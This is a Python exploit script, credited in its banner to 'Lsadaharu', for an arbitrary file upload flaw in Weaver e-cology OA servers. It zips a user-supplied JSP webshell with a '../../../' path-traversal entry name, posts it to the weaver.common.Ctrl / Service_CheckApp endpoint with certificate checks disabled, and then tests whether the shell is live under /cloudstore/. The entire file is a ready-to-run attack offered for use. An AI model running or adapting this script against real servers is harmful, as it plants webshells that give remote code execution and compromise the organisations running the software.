#coding: utf-8
import requests
import sys
import random
import zipfile
import urllib3
urllib3.disable_warnings()

G = '\033[32m'#绿
Y = '\033[33m'#黄
B = '\033[34m'#蓝
R = '\033[35m'#红
E = '\033[0m'#结束

def generate_random_str(length):
  random_str = ''
  base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789_'
  le = len(base_str) - 1
  for i in range(length):
    random_str += base_str[random.randint(0, length)]
  return random_str

random_name = generate_random_str(6)
shell_name=random_name+'.jsp'

def title():
    print(G,'<<<<<  E-Cology Weaver.Common.Ctrl Arbitrary File Upload EXP Code By Lsadaharu  >>>>>',E)
    print(G,'<<<<<                    Useful->python3 exp.py vul_url                         >>>>>',E)
    print(B,"<<<<<    If you want change shell_name,Be careful the shell_name naming rules   >>>>>",E)

def ShellZip():
    shell_path=str(input(Y+'Please enter the local path of Webshel​​l:'+E))
    try:
        zf=zipfile.ZipFile('test.zip',mode='w', compression=zipfile.ZIP_DEFLATED)
        with open(shell_path,'rb') as f:
            f=f.read()
            zf.writestr('../../../'+shell_name,f)
    except Exception as e:
        print(R,"[-] Get Shell File Failure,Please input shell path again",e,E)
        ShellZip()

def ShellUpload(url):
    ShellZip()
    poc_url=url+'/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp'
    files={'file':('test.zip',open('test.zip', 'rb'), 'application/zip')}
    requests.post(url=poc_url,files=files,timeout=10,verify=False)
    print(G,"[+] WebShell Uploading.......",E)
    GetShellUrl=f"{url}/cloudstore/{shell_name}"
    print(GetShellUrl)
    try:
        GetShellPoc=requests.get(url=GetShellUrl)
        if GetShellPoc.status_code == 200:
            print(G,'[*] WebShell Upload Success,Shell Path:',GetShellUrl,E)
        elif GetShellPoc.status_code == 403:
            print(B,"[-] Please Change the shell_name",E)
        else:
            print(B,"[-] WebShell Upload Failed",E)
    except Exception:
        print(R,"[-] Exploit Failure",E)

if __name__ == "__main__":
    title()
    if(len(sys.argv) == 2):
        url = sys.argv[1]
        ShellUpload(url)
    else:
        print(R,"[-] Error:python3 exp.py http://xx.xx.xx.xx",E)

